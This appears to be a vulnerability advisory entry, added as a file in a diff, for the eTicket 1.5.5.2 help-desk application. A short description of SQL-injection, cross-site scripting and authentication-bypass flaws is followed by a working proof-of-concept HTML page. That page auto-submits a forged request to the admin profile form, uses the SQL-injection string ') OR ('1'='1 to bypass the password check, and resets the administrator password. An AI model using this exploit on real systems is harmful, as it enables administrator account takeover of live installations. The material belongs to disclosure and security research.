@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/27173/info
+
+eTicket is prone to multiple input-validation vulnerabilities because the application fails to properly sanitize user-supplied input. These vulnerabilities include multiple SQL-injection issues, a cross-site scripting issue, and an authentication-bypass issue.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, exploit vulnerabilities in the underlying database, or execute arbitrary script code in the browser of an unsuspecting user.
+
+These issues affect eTicket 1.5.5.2; other versions may also be affected.
+
+<html>
+<body>
+<form id="csrf" name="csrf"
+action="http://www.example.com/eTicket/admin.php?a=my" method="post">
+<input type="hidden" name="a" value="my">
+<input type="text" name="username" value="admin"><br>
+<input type="text" name="name" value="admin"><br>
+<input type="text" name="email" value="mail@example.com"><br>
+<input type="password" name="password" value="&#039;) OR (&#039;1&#039;=&#039;1"><br>
+<input type="password" name="npassword" value="hacked"><br>
+<input type="password" name="vpassword" value="hacked"><br>
+<textarea name="sig" cols="30" rows="5">&lt;/textarea&gt;<br>
+<input type="submit" name="submit" value="Save Changes"><br>
+</form>
+<script language="JavaScript">document.getElementById(&#039;csrf&#039;).submit.click()</script>
+</body>
+</html>
